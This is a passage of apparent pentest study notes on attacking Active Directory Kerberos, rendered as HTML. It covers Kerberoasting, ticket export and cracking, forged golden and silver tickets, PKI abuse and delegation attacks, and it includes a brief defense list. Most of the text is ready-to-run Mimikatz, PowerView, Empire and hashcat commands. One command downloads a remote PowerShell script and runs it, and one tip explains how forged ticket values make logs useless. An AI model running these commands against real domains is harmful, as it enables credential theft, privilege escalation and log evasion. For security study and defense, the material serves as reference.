<span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80&quot;</span>
</pre></div>

<p>Alternatively, use Mimikatz by specifing target as the service principal name:
<div class="codehilite"><pre><span></span><span class="n">kerberos</span><span class="p">::</span><span class="n">ask</span> <span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">PENTESTLAB_001</span><span class="o">/</span><span class="n">WIN</span><span class="o">-</span><span class="n">PTELU2U07KG</span><span class="p">.</span><span class="n">PENTESTLAB</span><span class="p">.</span><span class="k">LOCAL</span><span class="p">:</span><span class="mi">80</span>
</pre></div></p>
<p>List all available cached tickets:
<div class="codehilite"><pre><span></span><span class="n">klist</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::list&quot;&#39;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="k">load</span> <span class="n">kiwi</span>
<span class="n">kerberos_ticket_list</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">kiwi_cmd</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">list</span>
</pre></div></p>
<p>Request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets (requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain):</p>
<div class="codehilite"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">request</span> <span class="n">pentestlab</span><span class="p">.</span><span class="k">local</span><span class="o">/</span><span class="n">test</span>
</pre></div>

<p>Automatically identify weak service tickets based on user account and password expiry (RiskySPN: <a href="https://github.com/cyberark/RiskySPN">https://github.com/cyberark/RiskySPN</a>):</p>
<div class="codehilite"><pre><span></span><span class="n">Find</span><span class="o">-</span><span class="n">PotentiallyCrackableAccounts</span> <span class="o">-</span><span class="n">FullData</span> <span class="o">-</span><span class="k">Verbose</span>
</pre></div>

<p>All user accounts that have an associated SPN:</p>
<div class="codehilite"><pre><span></span><span class="n">Find</span><span class="o">-</span><span class="n">PotentiallyCrackableAccounts</span> <span class="o">-</span><span class="k">Domain</span> <span class="ss">&quot;pentestlab.local&quot;</span>
</pre></div>

<p>Export to CVS (offline cracking):</p>
<div class="codehilite"><pre><span></span><span class="n">Export</span><span class="o">-</span><span class="n">PotentiallyCrackableAccounts</span>
</pre></div>

<p>Get service tickets for service instance by its SPN:</p>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">TGSCipher</span> <span class="o">-</span><span class="n">SPN</span> <span class="ss">&quot;PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80&quot;</span>
</pre></div>

<p>Various functions that can be executed to request, list and export service tickets: <a href="https://github.com/xan7r/kerberoast">Auto-Kerberoast</a></p>
<div class="codehilite"><pre><span></span><span class="n">List</span><span class="o">-</span><span class="n">UserSPNs</span>
<span class="n">List</span><span class="o">-</span><span class="n">UserSPNs</span> <span class="o">-</span><span class="k">Domain</span> <span class="ss">&quot;pentestlab.local&quot;</span>
</pre></div>

<p>Mass request tickets (ticket for each account)</p>
<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span>
<span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">T</span> <span class="n">lab</span><span class="p">.</span><span class="k">local</span> <span class="o">-</span><span class="n">Q</span> <span class="o">*/-</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="n">String</span> <span class="s1">&#39;^CN&#39;</span> <span class="o">-</span><span class="n">Content</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">|</span> <span class="o">%</span> <span class="err">{</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="k">Trim</span><span class="p">()</span> <span class="err">}</span>
<span class="p">.</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">ps1</span> <span class="o">|</span> <span class="o">%</span> <span class="err">{</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">ServicePrincipalName</span> <span class="err">}</span>
</pre></div>

<h4 id="step-3-export-service-tickets">Step 3 - Export Service Tickets<a class="headerlink" href="#step-3-export-service-tickets" title="Permanent link">&para;</a></h4>
<p>List all available tickets from memory and save in remote host:
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::list /export&quot;&#39;</span>
</pre></div></p>
<p>PowerShell Empire:
<div class="codehilite"><pre><span></span><span class="n">usemodule</span> <span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">extract_tickets</span>
<span class="n">standard</span><span class="p">::</span><span class="n">base64</span>
<span class="n">kerberos</span><span class="p">::</span><span class="n">list</span> <span class="o">/</span><span class="n">export</span>
</pre></div></p>
<p>Extract Ticket hashes for services that support Kerberos authentication:
<div class="codehilite"><pre><span></span><span class="n">usemodule</span> <span class="n">credentials</span><span class="o">/</span><span class="n">invoke_kerberoast</span>
</pre></div></p>
<p>AutoKerberoast will request and extract all the service tickets in base64 format.
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AutoKerberoast</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">AutoKerberoast</span> <span class="o">-</span><span class="n">GroupName</span> <span class="ss">&quot;Domain Admins&quot;</span> <span class="o">-</span><span class="k">Domain</span> <span class="n">pentestlab</span><span class="p">.</span><span class="k">local</span> <span class="o">-</span><span class="n">HashForm</span>
</pre></div></p>
<p>Extract hashed in different formats (John, Hashcat and Kerberoast) - eliminates the need of Mimikatz for ticket export 
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">TGSCipher</span> <span class="o">-</span><span class="n">SPN</span> <span class="ss">&quot;PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80&quot;</span> <span class="o">-</span><span class="n">Format</span> <span class="n">John</span>
</pre></div></p>
<p>Extract TGT responses from PCAP:</p>
<div class="codehilite"><pre><span></span><span class="n">extracttgsrepfrompcap</span><span class="p">.</span><span class="n">py</span>
</pre></div>

<h4 id="step-4-crack-service-tickets">Step 4 - Crack Service Tickets<a class="headerlink" href="#step-4-crack-service-tickets" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">tgsrepcrack</span><span class="p">.</span><span class="n">py</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span> <span class="n">PENTESTLAB_001</span><span class="p">.</span><span class="n">kirbi</span>
</pre></div>

<p>Extract the Hash from Service Ticket
<div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">extractServiceTicketParts</span><span class="p">.</span><span class="n">py</span> <span class="n">PENTESTLAB_001</span><span class="p">.</span><span class="n">kirbi</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">tgscrack</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">hashfile</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">wordlist</span> <span class="n">passwords</span><span class="p">.</span><span class="n">txt</span>
</pre></div></p>
<p>If PowerShell remoting is enabled then the password that has been retrieved from the service ticket can be used for execution of remote commands and for other lateral movement operations.</p>
<div class="codehilite"><pre><span></span><span class="n">Enable</span><span class="o">-</span><span class="n">PSRemoting</span>
<span class="err">$</span><span class="n">pass</span> <span class="o">=</span> <span class="s1">&#39;Password123&#39;</span> <span class="o">|</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="k">Force</span>
<span class="err">$</span><span class="n">creds</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="s1">&#39;PENTESTLAB_001&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">pass</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="k">get</span><span class="o">-</span><span class="n">process</span><span class="err">}</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">WIN</span><span class="o">-</span><span class="n">PTELU2U07KG</span><span class="p">.</span><span class="n">PENTESTLAB</span><span class="p">.</span><span class="k">LOCAL</span> <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">creds</span>
</pre></div>

<p>Dump returned service account with its correlating password hash:</p>
<div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">ep</span> <span class="n">bypass</span> <span class="o">-</span><span class="k">c</span> <span class="ss">&quot;IEX (New-Object System.Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt&quot;</span>

<span class="n">hashcat64</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="ss">&quot;C:\Hash1.txt&quot;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Rocktastic12a</span> <span class="c1">--outfile=&quot;C:\OutputHash1.txt&quot;`</span>
</pre></div>

<h4 id="step-5-rewrite-service-tickets-ram-injection">Step 5 - Rewrite Service Tickets &amp; RAM Injection<a class="headerlink" href="#step-5-rewrite-service-tickets-ram-injection" title="Permanent link">&para;</a></h4>
<ul>
<li>Kerberos tickets are signed with the NTLM hash of the password. </li>
<li>If the ticket hash has been cracked then it is possible to  rewrite the ticket with Kerberoast python script.</li>
<li>Allow: <ul>
<li>Impersonate any domain user when the service is going to be accessed.</li>
<li>Privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. </li>
</ul>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">kerberoast</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password123</span> <span class="o">-</span><span class="n">r</span> <span class="n">PENTESTLAB_001</span><span class="p">.</span><span class="n">kirbi</span> <span class="o">-</span><span class="n">w</span> <span class="n">PENTESTLAB</span><span class="p">.</span><span class="n">kirbi</span> <span class="o">-</span><span class="n">u</span> <span class="mi">500</span>
<span class="n">python</span> <span class="n">kerberoast</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password123</span> <span class="o">-</span><span class="n">r</span> <span class="n">PENTESTLAB_001</span><span class="p">.</span><span class="n">kirbi</span> <span class="o">-</span><span class="n">w</span> <span class="n">PENTESTLAB</span><span class="p">.</span><span class="n">kirbi</span> <span class="o">-</span><span class="k">g</span> <span class="mi">512</span>
</pre></div>

<ul>
<li>Also fake account. Use Mimikatz to generate ticket (change RID of the account to 1106):</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span>
  <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="k">local</span>
  <span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="o">&lt;</span><span class="n">sid</span><span class="o">&gt;</span>
  <span class="o">/</span><span class="n">groups</span><span class="p">:</span><span class="mi">123</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">125</span>
  <span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">target</span><span class="p">.</span><span class="k">local</span>
  <span class="o">/</span><span class="n">service</span><span class="p">:</span><span class="n">MSSQLSvc</span>
  <span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">target</span><span class="p">.</span><span class="k">local</span><span class="p">.</span><span class="n">kirbi</span>
  <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="o">&lt;</span><span class="n">service</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">hash</span><span class="o">&gt;</span>
  <span class="o">/</span><span class="n">ppt</span>
  <span class="o">/</span><span class="n">id</span><span class="p">:</span><span class="mi">1106</span>
  <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">tm</span>
</pre></div>

<p><code class="codehilite"><span class="o">/</span><span class="n">ppt</span></code> will directly inject the fake account into memory.</p>
<p><code class="codehilite"><span class="o">/</span><span class="n">id</span></code> and <code class="codehilite"><span class="o">/</span><span class="k">user</span></code> can be invalid values, so that logs will be useless </p>
<p><code class="codehilite"><span class="o">/</span><span class="n">groups</span></code> can be altered to add user to domain-admin</p>
<p>The new ticket can be injected back into the memory with </p>
<div class="codehilite"><pre><span></span><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">PENTESTLAB</span><span class="p">.</span><span class="n">kirbi</span>
</pre></div>

<h4 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h4>
<ul>
<li>Use <code class="codehilite"><span class="o">*-</span><span class="n">ADServiceAccount</span></code> cmdlet to create service accounts</li>
<li>Pick really random, good passwords (25+ chars )</li>
<li>Monitor DC for bursts of Service Ticket requests (Event ID 4769)</li>
<li>Force services to verify PAC
    - Doesn't prevent cracking
    - Prevent writing
    - Can impact performance</li>
</ul>
<h3 id="golden-ticket">Golden Ticket<a class="headerlink" href="#golden-ticket" title="Permanent link">&para;</a></h3>
<ul>
<li>Ticket not made by KDC (ticket is self-made)</li>
</ul>
<ul>
<li>Not limited by GPO</li>
</ul>
<ul>
<li>Smart-card independent</li>
</ul>
<ul>
<li>Hence, it's possible to push anything</li>
</ul>
<ul>
<li>Since we have krbtgt<ul>
<li>Can modify PAC</li>
<li>Group ID, SID, Username</li>
</ul>
</li>
</ul>
<ul>
<li>
<p><strong>Kerberos is stateless</strong></p>
<ul>
<li>
<p>All account policy is client side enforcement </p>
<ul>
<li>Disabled / Expiry / Logon hours</li>
<li>Silo memberships </li>
<li>Protected Users  and other group memberships</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>With Kerberos 5 - TGS / KDC has no way of validating that account is still valid when presented with TGT.</p>
<ul>
<li>
<p>Microsoft implement:</p>
<ul>
<li>If <strong>TGT</strong> is <strong>older than 20 mins</strong> the <strong>TGS</strong> will validate the account with KDC when issuing a service ticket. Account validity and check enabled state is checked.  </li>
</ul>
<ul>
<li>However, with Golden Ticket we issuer our own TGT. Therefore, it is possible to issue TGT with recent issued-times to bypass this check.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Why attack on TGT, but not on TGS?</p>
<ul>
<li>Service account passwords are rotated every 30-40 days. </li>
<li>Krbtgt account password is never changed. </li>
<li>A singled TGT can get many TGS. </li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>Ticket Encryption</th>
<th>PAC KDC Signature</th>
<th>PAC Server Signature</th>
</tr>
</thead>
<tbody>
<tr>
<td>TGT</td>
<td>krbtgt</td>
<td>krbtgt</td>
<td>krbtgt</td>
</tr>
<tr>
<td>TGS</td>
<td>target</td>
<td>krbtgt</td>
<td>target</td>
</tr>
</tbody>
</table>
<p>Generating "Golden Ticket":</p>
<ul>
<li>KDC key (krbtgt)</li>
<li>SID of the domain (whom, psgetsid)</li>
<li>Domain name</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="n">name</span><span class="o">:</span><span class="n">krbtgt</span>
<span class="n">kerberos</span><span class="o">::</span><span class="n">golden</span> <span class="o">/</span><span class="n">domain</span><span class="o">:&lt;</span><span class="n">domain</span><span class="o">&gt;</span>
  <span class="o">/</span><span class="n">sid</span><span class="o">:&lt;</span><span class="n">domain</span><span class="o">-</span><span class="n">sid</span><span class="o">&gt;</span>
  <span class="o">/</span><span class="n">rc4</span><span class="o">:&lt;</span><span class="n">ntlm</span><span class="o">-</span><span class="n">hash</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">krbtgt</span><span class="o">&gt;</span>
  <span class="o">/</span><span class="n">user</span><span class="o">:</span><span class="n">Administrator</span>
  <span class="o">/</span><span class="n">id</span><span class="o">:</span><span class="m">500</span>                         <span class="o">&lt;-</span> <span class="n">RID</span> <span class="n">of</span> <span class="n">the</span> <span class="nf">user </span><span class="p">(</span><span class="m">500</span> <span class="n">is</span> <span class="n">domain</span> <span class="n">admin</span><span class="p">)</span>
  <span class="o">/</span><span class="n">groups</span><span class="o">:</span><span class="m">513</span><span class="p">,</span><span class="m">512</span><span class="p">,</span><span class="m">520</span><span class="p">,</span><span class="m">518</span><span class="p">,</span><span class="m">519</span>
  <span class="o">/</span><span class="n">ticket</span><span class="o">:</span><span class="n">Administrator.kirbi</span>     <span class="o">&lt;-</span> <span class="n">ticket</span> <span class="n">filename</span>
</pre></div>

<h3 id="silver-tickets">Silver Tickets<a class="headerlink" href="#silver-tickets" title="Permanent link">&para;</a></h3>
<ul>
<li>Password hashes of service accounts could be used to create</li>
<li>Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account.</li>
<li>Can request a ticket and do offline brute forcing.</li>
</ul>
<p><img alt="Kerberos Silver Ticket" src="https://lh5.googleusercontent.com/OKN30PLvn-kXiOXCz4fHfd7mHn_SUCdTnJBRB_NRYpWj9B57kc8cbyn1Ga-pLlWQ38jNvRs7Cz-gpQr0iFpg=w1360-h611-rw" /></p>
<blockquote>
<p><a href="https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD">https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD</a></p>
</blockquote>
<ul>
<li>KDC does not handle authorization</li>
<li>Can request TGS for any service</li>
<li>TGS is encrypted using target-service NTLM hash</li>
<li>.:. it is possible to brute-force the TGS to get target-service account credentials</li>
</ul>
<h4 id="find-service-accounts">Find Service Accounts<a class="headerlink" href="#find-service-accounts" title="Permanent link">&para;</a></h4>
<p>GetUserSPNs</p>
<blockquote>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a></p>
</blockquote>
<p>PowerView (SPN = Service Principal Name)
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Netuser</span> <span class="o">-</span><span class="n">SPN</span>
</pre></div></p>
<p>ActiveDirectory Module
<div class="codehilite"><pre><span></span><span class="n">Install</span><span class="o">-</span><span class="n">ActiveDirectoryModule</span> <span class="o">-</span><span class="n">DllPath</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">AdModule</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span> <span class="n">ADModulePath</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">AdModule</span><span class="err">\</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">psd1</span>

<span class="k">Get</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Filter</span> <span class="err">{</span><span class="n">ServicePrincipalName</span> <span class="o">-</span><span class="n">ne</span> <span class="ss">&quot;$null&quot;</span><span class="err">}</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">ServicePrincipalName</span>
</pre></div></p>
<h4 id="request-spn-ticket">Request SPN Ticket<a class="headerlink" href="#request-spn-ticket" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span>

<span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;&lt;server-name&gt;&quot;</span>
</pre></div>

<p>PowerView
<div class="codehilite"><pre><span></span><span class="n">Request</span><span class="o">-</span><span class="n">SPNTicket</span>
</pre></div></p>
<h4 id="save-tieket">Save Tieket<a class="headerlink" href="#save-tieket" title="Permanent link">&para;</a></h4>
<p>List all tickets in cache (check if granted)
<div class="codehilite"><pre><span></span><span class="n">klist</span>
</pre></div></p>
<p>Mimikatz
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::list /export&quot;&#39;</span>
</pre></div></p>
<h4 id="bruteforce">Bruteforce<a class="headerlink" href="#bruteforce" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="p">.</span><span class="err">\</span><span class="n">tgsrepcrack</span><span class="p">.</span><span class="n">py</span> <span class="p">.</span><span class="err">\</span><span class="n">password</span><span class="p">.</span><span class="n">txt</span> <span class="s1">&#39;&lt;ticket&gt;&#39;</span>
</pre></div>

<p>or use John</p>
<h3 id="smart-card-authentication-with-dh-keys">Smart Card Authentication with DH Keys<a class="headerlink" href="#smart-card-authentication-with-dh-keys" title="Permanent link">&para;</a></h3>
<p><img alt="image-20190611081126158" src="../_assets/image-20190611081126158.png" /></p>
<ul>
<li>If certificate based authentication is required DH must be implemented (as per spec)</li>
<li>RFC 4556</li>
<li>RFC 5349</li>
<li>Microsoft improved current protocol with draft:<ul>
<li><a href="https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07">https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07</a></li>
<li><a href="https://datatracker.ietf.org/meeting/91/session/kitten">https://datatracker.ietf.org/meeting/91/session/kitten</a><ul>
<li><a href="https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf">https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf</a></li>
</ul>
</li>
<li>In order for GPO to work full network should be aware of it (&gt; Windows 10 &amp; 2016)</li>
</ul>
</li>
<li>Detect using IPS rule to inspect AS-REQ (AS-REQ is now signed, not encrypted)</li>
</ul>
<h3 id="attacking-windows-pki">Attacking Windows PKI<a class="headerlink" href="#attacking-windows-pki" title="Permanent link">&para;</a></h3>
<ul>
<li>Mimikatz can export Windows CA (NTAuth certificate store )</li>
<li>Ask PKI server to generate a raw certificate (with any required expiry and any required user) without CRLDP so that cert cannot be revoked. </li>
</ul>
<h2 id="kerberos-delegation">Kerberos Delegation<a class="headerlink" href="#kerberos-delegation" title="Permanent link">&para;</a></h2>
<ul>
<li>Allows reusing the end-user credentials to access resources hosted on a different server.</li>
<li>Used when <code class="codehilite"><span class="n">Kerberos</span> <span class="n">Double</span> <span class="n">Hop</span></code> is required.</li>
<li>Impersonating the incoming/authentication user is necessary to work.</li>
<li>Types:<ul>
<li>Unconstrained (only Windows Server 2003 &lt;) - Allow authentication to any service in the domain</li>
<li>Constrained</li>
</ul>
</li>
</ul>
<h3 id="unconstrained-kerberos-delegation">Unconstrained Kerberos Delegation<a class="headerlink" href="#unconstrained-kerberos-delegation" title="Permanent link">&para;</a></h3>
<p><img alt="Kerberos Delegation" src="https://lh5.googleusercontent.com/MgazYuWpQRvg25S48nMh5iPbeX76N-GF078pRWy7jBo4MqO3k4rPaBHdZXDL-GLEqv2GDfrsMlp6gNahYYLU=w1360-h611-rw" /></p>
<blockquote>
<p><a href="https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY">https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY</a></p>
</blockquote>
<ol>
<li>User provide credentials to DC</li>
<li>DC returns TGT</li>
<li>User request TGS for web service</li>
<li>DC provides TGS (TGS contains user's TGT)</li>
<li>User sends TGT and TGS to web Server</li>
<li>Web server service account use user's TGT to request a TGS got database server from DC
 - Web server service account can decrypt TGS and extract the user's TGT
 - This is because TGS is encryoted with web server service account's NTLM hash</li>
<li>Web server service account connects to database impersonating the user</li>
</ol>
<h4 id="identifying-nodes-with-unconstrained-delegation-enabled">Identifying Nodes with Unconstrained Delegation Enabled<a class="headerlink" href="#identifying-nodes-with-unconstrained-delegation-enabled" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">NetComputer</span> <span class="o">-</span><span class="n">UnConstrained</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">ADComputer</span> <span class="o">-</span><span class="n">Filter</span> <span class="err">{</span><span class="n">TrustedForDelegation</span> <span class="o">-</span><span class="n">eq</span> <span class="err">$</span><span class="k">True</span><span class="err">}</span>
<span class="k">Get</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Filter</span> <span class="err">{</span><span class="n">TrustedForDelegation</span> <span class="o">-</span><span class="n">eq</span> <span class="err">$</span><span class="k">True</span><span class="err">}</span>
</pre></div>

<h5 id="attack-pattern">Attack Pattern<a class="headerlink" href="#attack-pattern" title="Permanent link">&para;</a></h5>
<ul>
<li>Compromise the server that use unconstrained delegation</li>
<li>Wait for a high privileged connect</li>
<li>Once connected, export all the tickets including TGT for that User</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets /export&quot;&#39;</span>
</pre></div>

<p>Reuse tickets with
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::ppt C:\tickets\admin.kirbi&quot;&#39;</span>
</pre></div></p>
<h3 id="constrained-kerberos-delegation">Constrained Kerberos Delegation<a class="headerlink" href="#constrained-kerberos-delegation" title="Permanent link">&para;</a></h3>
<ul>
<li>Only provide access to specified services on a specifiv computer</li>
<li>Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute</li>
<li>Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute</li>
</ul>
<h4 id="identifying-users-with-unconstrained-delegation-enabled">Identifying Users with Unconstrained Delegation Enabled<a class="headerlink" href="#identifying-users-with-unconstrained-delegation-enabled" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">TrustedToAuth</span>
<span class="k">Get</span><span class="o">-</span><span class="n">DomainComputer</span> <span class="o">-</span><span class="n">TrustedToAuth</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">Install</span><span class="o">-</span><span class="n">ActiveDirectoryModule</span> <span class="o">-</span><span class="n">DllPath</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">AdModule</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span> <span class="n">ADModulePath</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">AdModule</span><span class="err">\</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">psd1</span>

<span class="k">Get</span><span class="o">-</span><span class="n">ADObject</span> <span class="o">-</span><span class="n">Filter</span> <span class="err">{</span><span class="n">msDS</span><span class="o">-</span><span class="n">AllowedToDelegateTo</span> <span class="o">-</span><span class="n">ne</span> <span class="ss">&quot;$null&quot;</span><span class="err">}</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">msDS</span><span class="o">-</span><span class="n">AllowedToDelegateTo</span>
</pre></div>

<h5 id="attack-patterns_1">Attack Patterns<a class="headerlink" href="#attack-patterns_1" title="Permanent link">&para;</a></h5>
<ul>
<li>Protocol Transition used in SSO</li>
<li>Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified.</li>
</ul>
<blockquote>
<p><a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a></p>
</blockquote>
<h2 id="attacks">Attacks<a class="headerlink" href="#attacks" title="Permanent link">&para;</a></h2>
